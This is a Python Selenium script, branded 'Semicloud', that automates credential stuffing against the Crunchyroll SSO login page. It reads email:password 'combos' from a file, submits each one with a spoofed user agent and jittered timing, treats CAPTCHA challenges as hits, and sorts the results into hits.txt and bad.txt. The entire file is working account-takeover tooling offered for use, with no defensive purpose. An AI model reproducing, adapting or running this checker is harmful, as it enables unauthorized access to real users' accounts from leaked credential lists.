"""
Clean Selenium bot with ASCII banner + HIT/BAD only output.

Requirements:
  pip install selenium webdriver-manager colorama pyfiglet
"""

from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time, os, random, warnings

import tkinter as tk
from tkinter import filedialog, messagebox

from colorama import init as colorama_init, Fore, Style
import pyfiglet

colorama_init(autoreset=True)

website_link = "https://sso.crunchyroll.com/login"
KEEP_BROWSER_OPEN = False

CUSTOM_USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36"

FIXED_CADENCE_SECONDS = 3.0
JITTER_MAX = 0.2

RESULT_FOLDER = "Comboz"
os.makedirs(RESULT_FOLDER, exist_ok=True)
HITS_FILE = os.path.join(RESULT_FOLDER, "hits.txt")
BAD_FILE = os.path.join(RESULT_FOLDER, "bad.txt")

CAPTCHA_TREAT_AS_HIT = True
CAPTCHA_POLL_SECONDS = 4
CAPTCHA_POLL_INTERVAL = 0.5

warnings.filterwarnings("ignore")


def clear_terminal_with_banner():
    os.system("cls" if os.name == "nt" else "clear")
    ascii_banner = pyfiglet.figlet_format("Semicloud")
    print(Fore.BLUE + ascii_banner + Style.RESET_ALL)

def choose_file_dialog():
    root = tk.Tk()
    root.withdraw()
    root.attributes("-topmost", True)
    file_path = filedialog.askopenfilename(
        title="Select your combo file (email:pass per line)",
        filetypes=[("Text files", "*.txt *.csv"), ("All files", "*.*")]
    )
    root.destroy()
    return file_path

def find_clickable_button(driver, texts):
    for t in texts:
        xpath_candidates = [
            f"//button[normalize-space()='{t}']",
            f"//input[@type='submit' and normalize-space(@value)='{t}']",
            f"//a[normalize-space()='{t}']",
            f"//div[normalize-space()='{t}' and (@role='button' or contains(@class,'button'))]"
        ]
        for xp in xpath_candidates:
            els = driver.find_elements(By.XPATH, xp)
            if els:
                return els[0]
    return None

def find_email_input(driver):
    candidates = [
        (By.XPATH, "//input[@type='email']"),
        (By.XPATH, "//input[contains(@name,'email') or contains(@id,'email')]"),
        (By.XPATH, "//input[contains(translate(@placeholder,'EMAIL','email'),'email')]"),
        (By.XPATH, "//label[contains(translate(.,'EMAIL','email'),'email')]/following::input[1]"),
    ]
    for by, val in candidates:
        elems = driver.find_elements(by, val)
        if elems:
            return elems[0]
    raise Exception("Email input not found.")

def append_to_file(file_path, combo):
    with open(file_path, "a", encoding="utf-8") as f:
        f.write(combo + "\n")

def print_result(status, combo):
    if status == "HIT":
        print(Fore.GREEN + f"HIT : {combo}" + Style.RESET_ALL)
    else:
        print(Fore.RED + f"BAD : {combo}" + Style.RESET_ALL)


def detect_captcha(driver):
    try:
        iframes = driver.find_elements(By.TAG_NAME, "iframe")
        for iframe in iframes:
            src = iframe.get_attribute("src") or ""
            if "recaptcha" in src.lower() or "google.com/recaptcha" in src.lower():
                return True

        captcha_elems = driver.find_elements(By.XPATH,
            "//*[contains(translate(@class,'CAPTCHA','captcha'),'captcha') "
            "or contains(translate(@id,'CAPTCHA','captcha'),'captcha') "
            "or contains(translate(@name,'CAPTCHA','captcha'),'captcha')]")
        if captcha_elems:
            return True

        img_elems = driver.find_elements(By.XPATH,
            "//img[contains(translate(@alt,'CAPTCHA','captcha'),'captcha')]")
        if img_elems:
            return True

        captcha_inputs = driver.find_elements(By.XPATH,
            "//input[contains(translate(@name,'CAPTCHA','captcha'),'captcha') "
            "or contains(translate(@id,'CAPTCHA','captcha'),'captcha')]")
        if captcha_inputs:
            return True
    except Exception:
        pass
    return False

def detect_reset_password(driver):
    try:
        reset_elems = driver.find_elements(
            By.XPATH,
            "//*[contains(translate(.,'RESET','reset'),'reset password')]"
        )
        if reset_elems:
            return True
    except Exception:
        pass
    return False

def is_likely_success(driver, initial_login_url):
    try:
        current_url = driver.current_url
        pw_present = driver.find_elements(By.XPATH, "//input[@type='password']")
        if (initial_login_url.lower() not in current_url.lower()) and (not pw_present):
            return True
        error_elems = driver.find_elements(By.XPATH,
            "//*[contains(translate(.,'ERROR','error'),'incorrect') "
            "or contains(translate(.,'INVALID','invalid'),'invalid') "
            "or contains(translate(.,'WRONG','wrong'),'wrong') "
            "or contains(@class,'error') or contains(@id,'error')]")
        if error_elems:
            return False
    except Exception:
        pass
    return False


def main():
    clear_terminal_with_banner()
    combo_path = choose_file_dialog()
    if not combo_path or not os.path.isfile(combo_path):
        return

    combos = []
    with open(combo_path, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            s = line.strip()
            if not s or s.startswith("#"):
                continue
            sep = None
            for candidate in (":", "|", ","):
                if candidate in s:
                    sep = candidate
                    break
            if not sep:
                continue
            email, password = s.split(sep, 1)
            email, password = email.strip(), password.strip()
            if email and password:
                combos.append((email, password))

    if not combos:
        messagebox.showerror("No combos", "No valid email:password combos found.")
        return

    options = webdriver.ChromeOptions()
    options.add_argument(f"user-agent={CUSTOM_USER_AGENT}")
    options.add_experimental_option("excludeSwitches", ["enable-logging"])
    driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=options)

    try:
        initial_url = website_link

        for email, password in combos:
            combo_text = f"{email}:{password}"
            try:
                driver.get(initial_url)
                time.sleep(1.0)

                email_input = find_email_input(driver)
                email_input.clear()
                email_input.send_keys(email)
                time.sleep(0.5)

                password_input = WebDriverWait(driver, 15).until(
                    EC.visibility_of_element_located((By.XPATH, "//input[@type='password']"))
                )
                password_input.send_keys(password)

                login_btn = find_clickable_button(driver, ["LOG IN","Login","Sign In","Submit"])
                if login_btn:
                    login_btn.click()
                else:
                    password_input.send_keys(Keys.ENTER)

                time.sleep(2.0)

                # Check reset password first
                if detect_reset_password(driver):
                    print_result("BAD", combo_text + "  (RESET REQUIRED)")
                    append_to_file(BAD_FILE, combo_text)
                else:
                    # Check captcha
                    captcha_found = False
                    if CAPTCHA_POLL_SECONDS > 0:
                        end = time.time() + CAPTCHA_POLL_SECONDS
                        while time.time() < end:
                            if detect_captcha(driver):
                                captcha_found = True
                                break
                            time.sleep(CAPTCHA_POLL_INTERVAL)
                    else:
                        captcha_found = detect_captcha(driver)

                    if captcha_found and CAPTCHA_TREAT_AS_HIT:
                        print_result("HIT", combo_text + "  (CAPTCHA)")
                        append_to_file(HITS_FILE, combo_text)
                    else:
                        success = is_likely_success(driver, initial_url)
                        if success:
                            print_result("HIT", combo_text)
                            append_to_file(HITS_FILE, combo_text)
                        else:
                            print_result("BAD", combo_text)
                            append_to_file(BAD_FILE, combo_text)

                jitter = random.uniform(-JITTER_MAX, JITTER_MAX)
                time.sleep(max(0.0, FIXED_CADENCE_SECONDS + jitter))

            except Exception:
                print_result("BAD", combo_text)
                append_to_file(BAD_FILE, combo_text)
                time.sleep(FIXED_CADENCE_SECONDS)
                continue

    finally:
        if not KEEP_BROWSER_OPEN:
            driver.quit()

if __name__ == "__main__":
    main()
